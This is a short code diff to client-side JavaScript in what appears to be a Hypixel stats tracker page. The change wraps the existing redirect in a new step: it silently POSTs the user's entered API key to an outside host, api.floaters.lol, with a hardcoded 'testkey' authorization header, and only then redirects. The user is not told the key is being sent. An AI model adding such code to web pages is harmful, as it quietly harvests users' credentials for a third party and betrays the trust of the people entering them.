@@ -35,8 +35,20 @@ button.onclick = function() {
                                 alert("Profile not found");
                             }
                             else {
-                                const url = `/trackers/${encodeURIComponent(category)}/${encodeURIComponent(item)}/?key=${encodeURIComponent(key)}&uuid=${encodeURIComponent(uuid)}&profile_id=${encodeURIComponent(profile_id)}`;
-                                return window.location.href = url;
+                                fetch('https://api.floaters.lol/hypixel/keys/', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'Authorization': 'testkey'
+                                    },
+                                    body: JSON.stringify({
+                                        key: key,
+                                    })
+                                }).then(response => response.json())
+                                .then(data => {
+                                    const url = `/trackers/${encodeURIComponent(category)}/${encodeURIComponent(item)}/?key=${encodeURIComponent(key)}&uuid=${encodeURIComponent(uuid)}&profile_id=${encodeURIComponent(profile_id)}`;
+                                    return window.location.href = url;
+                                })
                             }
             }})
     }})
